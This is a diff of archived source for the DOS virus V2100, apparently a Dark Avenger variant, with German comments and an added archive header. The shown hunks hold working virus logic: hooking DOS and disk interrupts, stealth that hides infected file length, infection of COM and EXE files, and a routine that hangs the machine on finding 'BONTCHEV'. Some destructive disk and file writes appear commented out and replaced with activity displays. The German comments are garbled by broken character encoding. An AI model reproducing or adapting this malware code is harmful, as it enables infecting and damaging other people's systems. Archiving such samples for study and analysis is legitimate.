@@ -1,12 +1,23 @@
+; ------------------------------------------------------------
+; name      V
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 ;--------------------------------------------------------------  
 ;       V2100.ASM
 ;
 ;       Source von V2100.COM / noch ein Dark-Avenger-Virus
 ;
 ;       Stealth
-;       Zerstîrt BOOT+Partitionstabelle
+;       ZerstÔøΩrt BOOT+Partitionstabelle
 ;       Infiziert COM+EXE
-;       LÑdt sich in oberen Speicherbereich
+;       LÔøΩdt sich in oberen Speicherbereich
 ;
 ;--------------------------------------------------------------  
 code    SEGMENT
@@ -38,7 +49,7 @@ DPB     ends
 ;--------------------------------------------------------------  
 start:  JMP     VirStart
         ;-----------------------------------------------------
-        ;       Die NOPS sind fÅr den TD unbedingt notwendig !
+        ;       Die NOPS sind fÔøΩr den TD unbedingt notwendig !
         ;-----------------------------------------------------
 	NOP	
 	NOP	
@@ -68,7 +79,7 @@ FirstByte:      DB      00h              ; Ofs 0
                 DB      14h              ; Ofs 0e
                 DB      00h              ; Ofs 0f
                 DB      00h              ; Ofs 10
-        ;=======( eingefÅgt )=================================
+        ;=======( eingefÔøΩgt )=================================
 Infected        DB      7,'INFECTED',0
 destroyed       DB      7,'DESTROYED',0
 Down            DB      7,'DOWN',0
@@ -199,7 +210,7 @@ CheckFileForStealth:
         AND     AL,1Fh                       ; Sekunde auf '62' gesetzt ?
 	CMP	AL,1Fh
         JNZ     J001D3                       ; nein, dann geben wir die 
-        MOV     AX,Word Ptr DS:[BX+DI+1Ah]   ; echte LÑnge zurÅck.
+        MOV     AX,Word Ptr DS:[BX+DI+1Ah]   ; echte LÔøΩnge zurÔøΩck.
         MOV     SI,Word Ptr DS:[BX+DI+1Ch]   ; sonst : ziehe 2100 ab..
         SUB     AX,2100d                     ; =0834h
 	SBB	SI,+00h
@@ -378,7 +389,7 @@ J002F5: CALL    GetChar
         CMP     AL,'m'          ; war es ein COM-File ??
 	JMP	SHORT J002FE
         ;-----------------------------------------------------        
-J002FC: INC     AL              ; Lîscht ZF !
+J002FC: INC     AL              ; LÔøΩscht ZF !
 J002FE: POP	SI 
 	POP	AX 
 	RETN	
@@ -443,7 +454,7 @@ J0036C: PUSHF
 	PUSH	DS 
 	PUSH	DX 
 	PUSH	BX 
-        MOV     AX,3D02h        ; ôffne R/W
+        MOV     AX,3D02h        ; ÔøΩffne R/W
         CALL    INT21
 	JB	J00381
 	XCHG	AX,BX 
@@ -491,11 +502,11 @@ J003A8: MOV     AX,0201h        ; Lese 1 Sektor
         INT     13H                 
 	POP	BX 
         ;-----------------------------------------------------        
-        ;       MOV     AX,0303h        ; Drei Sektoren Åberschreiben
+        ;       MOV     AX,0303h        ; Drei Sektoren ÔøΩberschreiben
         ;       MOV     CX,0001h        ; Sektor Nummer 1 / Partitionssektor !
         ;       XOR     DH,DH           ; Kopf 0 
         ;       INT     13H             ; Kaputt !         
-        ;======( eingefÅgt )=======================
+        ;======( eingefÔøΩgt )=======================
         CALL    DISPLAYACTIVITY
         ;==========================================
 	JMP	SHORT J003E1
@@ -554,7 +565,7 @@ J0042F: MOV     SI,Offset BontChev-Offset FirstByte
 	REPNZ   SCASB	
 	JNZ	J00446
         ;--------------------------------------
-        ; BONTCHEV gefunden. System aufhÑngen !        
+        ; BONTCHEV gefunden. System aufhÔøΩngen !        
         ;--------------------------------------
         PUSH    CX 
 	PUSH	DI 
@@ -565,8 +576,8 @@ J0042F: MOV     SI,Offset BontChev-Offset FirstByte
 	JNZ	J0042F
         ; ---------------------- refresh-timer verstellen ---------------
         ;       MOV     AL,54h
-        ;       OUT     43h,AL           ; ergibt ParitÑtsfehler !
-        ;======( eingefÅgt )=======================
+        ;       OUT     43h,AL           ; ergibt ParitÔøΩtsfehler !
+        ;======( eingefÔøΩgt )=======================
         CALL    DISPLAYACTIVITY
         ;==========================================
 
@@ -595,7 +606,7 @@ J0045F: POP     SI                                       ; Get IP
         ADD     SP,Offset @Stack-Offset Firstbyte
 	STI	
         CMP     SP,Word Ptr DS:[0006h]
-        JNB     JmpCOM       ; Zuwenig Stack , keine Infektion mîglich !
+        JNB     JmpCOM       ; Zuwenig Stack , keine Infektion mÔøΩglich !
         
 J00486: PUSH	AX 
 	PUSH	ES 
@@ -616,11 +627,11 @@ J00486: PUSH	AX
 	JB	J004AE
         
         MOV     AH,13h                  ; Swap INT 13h-Handler
-        INT     2FH                     ; Jetzt enthÑlt DS:DX und
+        INT     2FH                     ; Jetzt enthÔøΩlt DS:DX und
                                         ; ES:BX aber ROM-Entry
         PUSH    DS                                
         PUSH    DX                      ; Merk Dir den ROM-Entry
-        MOV     AH,13h                  ; und swappe zurÅck !
+        MOV     AH,13h                  ; und swappe zurÔøΩck !
         INT     2FH
 	POP	DX 
         POP     DS
@@ -656,7 +667,7 @@ J004AE: MOV     Word Ptr CS:[SI+Offset Int13ROM_Entry+1-Offset FirstByte],DX
         CMP     WORD Ptr DS:[0000h],0AA55h ; ist dort eine BIOS-Kennung ?
         JNZ     J00542          ; nein
         MOV     DL,Byte  Ptr DS:[0002h] 
-                                ; ?? LÑnge des Bios ?? holen  
+                                ; ?? LÔøΩnge des Bios ?? holen  
         
 J004FF: MOV	DS,AX
 	XOR	DH,DH
@@ -879,7 +890,7 @@ J0065A: MOV     AL,byte Ptr DS:[BX+DPB.MediaDescrpt]
         ; Hier installiert es sich durch die Hintertuer !!!
         ;----------------------------------------------------------
         ;
-        ;-------( Hier wird der Code verÑndert  )------------------
+        ;-------( Hier wird der Code verÔøΩndert  )------------------
         ;
         ;----------------------------------------------------------
                                         ; ES=CS !
@@ -990,7 +1001,7 @@ Virus_KEEP_Procedure:
         PUSH    CS                      
 	POP	DS 
         CMP     DX,CX                           ; Ist INT 21 schon von
-        JNZ     J0072E                          ; mir Åbernommen ?
+        JNZ     J0072E                          ; mir ÔøΩbernommen ?
 	MOV	AX,ES
         MOV     SI,CS                           ; dieselbe Frage
 	CMP	AX,SI
@@ -1040,7 +1051,7 @@ INFECT_File:
         INT     21H             
         
         MOV     Word Ptr DS:[SI+1Ah],DX ; FilePointer, HiWord
-        CMP     AX,0809h                ; ist File lÑnger als 2057 Byte 
+        CMP     AX,0809h                ; ist File lÔøΩnger als 2057 Byte 
 	SBB	DX,+00h
         JB      J007F7                  ; und kleiner als 65536 byte ?
         
@@ -1066,11 +1077,11 @@ J00793: MOV     AX,Word Ptr DS:[SI+0Ch] ; Maximum Memory needed
 	XCHG	AX,DX 
 	JMP	SHORT J007C0
         ;--------------------------------        
-J007AE: CMP     BYTE Ptr DS:[SI],0E9H   ; Ein COM. FÑngt's mit JMP xy an ?
+J007AE: CMP     BYTE Ptr DS:[SI],0E9H   ; Ein COM. FÔøΩngt's mit JMP xy an ?
         JNZ     J007F8                  ; nein 
         MOV     DX,Word Ptr DS:[SI+01h] ; ja, dann ist es gaaanz leicht...
 	ADD	DX,0103h
-        JB      J007F8                  ; Sprung Åber 1 Segment ?
+        JB      J007F8                  ; Sprung ÔøΩber 1 Segment ?
 	DEC	DH
         XOR     CX,CX                   
 J007C0: SUB     DX,4Dh          
@@ -1153,7 +1164,7 @@ J0082F: MOV     AX,5700h          ; Hole File-Datum/Uhrzeit
         ;------------------------------------------
         ;       MOV     AH,40h          ; SCHREIBE
         ;       INT     21H
-        ;======( eingefÅgt )=======================
+        ;======( eingefÔøΩgt )=======================
         PUSH    CX
         CALL    DISPLAYACTIVITY
         POP     AX
@@ -1171,7 +1182,7 @@ J00863: MOV     DX,0000h
         ;------------------------------------------
         ;       MOV     AH,40h                  ; SCHREIBE
         ;       INT     21H
-        ;======( eingefÅgt )=======================
+        ;======( eingefÔøΩgt )=======================
         PUSH    CX
         CALL    DISPLAYACTIVITY
         POP     AX
@@ -1223,13 +1234,13 @@ J00899: ADD     AX,WORD Ptr DS:[SI+18h]
 	JZ	J008D6
 	INC	AX 
 J008D6: MOV     WORD Ptr DS:[SI+04h],AX
-        MOV     CX,0018h                        ; LÑnge des EXE-Headers
+        MOV     CX,0018h                        ; LÔøΩnge des EXE-Headers
         ;
 J008DC: MOV	DX,SI
         ;------------------------------------------
         ;       MOV     AH,40h                  ; SCHREIBE
         ;       INT     21H
-        ;======( eingefÅgt )=======================
+        ;======( eingefÔøΩgt )=======================
         CALL    DISPLAYACTIVITY
         ;==========================================
         ;------------------------------------------
